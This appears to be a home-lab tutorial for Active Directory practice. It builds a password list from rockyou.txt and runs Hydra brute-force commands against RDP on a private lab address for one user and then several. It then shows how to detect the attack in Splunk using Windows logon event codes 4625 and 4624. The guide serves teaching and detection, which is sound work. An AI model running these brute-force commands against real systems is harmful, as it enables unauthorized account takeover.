# Performing Hydra Attack

## 1. Preparing a Password List for Brute Forcing

1. Open Terminal in Kali and go to the Desktop:
    ```bash
    cd ~/Desktop
    ```
2. Create a project directory:
    ```bash
    mkdir ad-project
    cd ad-project
    ```
3. Copy the default wordlist:
    ```bash
    cp /usr/share/wordlists/rockyou.txt .
    ```
4. Create a smaller password file for testing:
    ```bash
    head -n 20 rockyou.txt > passwords.txt
    ```
5. Edit or add passwords as needed:
    ```bash
    nano passwords.txt
    ```
    - Add or edit passwords, then save with `CTRL+O` and exit with `CTRL+X`.
6. Confirm the file exists:
    ```bash
    ls
    ```
https://github.com/user-attachments/assets/e2a092fc-5e40-4f08-a728-329b49eeb516


---


## 2. Performing a Brute Force Attack with Hydra

1. Navigate to your project directory:
    ```bash
    cd ~/Desktop/ad-project
    ```
2. Run Hydra for a single username:
    ```bash
    hydra -l jennyj -P passwords.txt rdp://192.168.10.100 -t 1
    ```
    - `-l` specifies the username.
    - `-P` points to your password list.
    - `rdp://192.168.10.100` is the RDP protocol and target IP.
    - `-t 1` sets the number of parallel tasks.
3. To attack multiple users:
    - Create a username list:
      ```bash
      nano login.txt
      ```
      (Add usernames, one per line. Save and exit.)
    - Run Hydra:
      ```bash
      hydra -L login.txt -P passwords.txt rdp://192.168.10.100 -t 1
      ```
    - `-L` is used for multiple usernames.

- Hydra will display successful username/password combinations.


https://github.com/user-attachments/assets/cfb8a722-c421-4429-a004-153ea8bd96de


---


## 3. Monitoring the Attack in Splunk

1. On your Windows 10 or Windows Server VM, open a browser and go to the Splunk server:
    ```
    http://192.168.10.10:8000
    ```
2. In Splunk, go to **Apps > Search & Reporting**.
3. In the search bar, enter:
    ```
    index="endpoint" jennyj
    ```
    - This will show all logs/events related to the user "jennyj."
4. On the left, click **EventCode** to view event codes.
    - **4625:** Account failed to log on (failed login attempts)
    - **4624:** Account successfully logged on
5. Clicking an event shows details, including workstation and attacker's IP.

> **Tip:** Multiple failed logins in a short time likely indicate a brute-force attack.


https://github.com/user-attachments/assets/37c1ef54-11bb-4b35-be7e-8e9de5cc9e5b


---

## Additional Recommendations

- Always use isolated networks for labs.
- Never attack real/live systems without permission.
- Regularly snapshot your VMs for easy rollback.

---

**This guide provides a safe, educational environment for practicing Active Directory attacks and monitoring. For any issues or clarifications, consult the documentation or reach out to your instructor.**
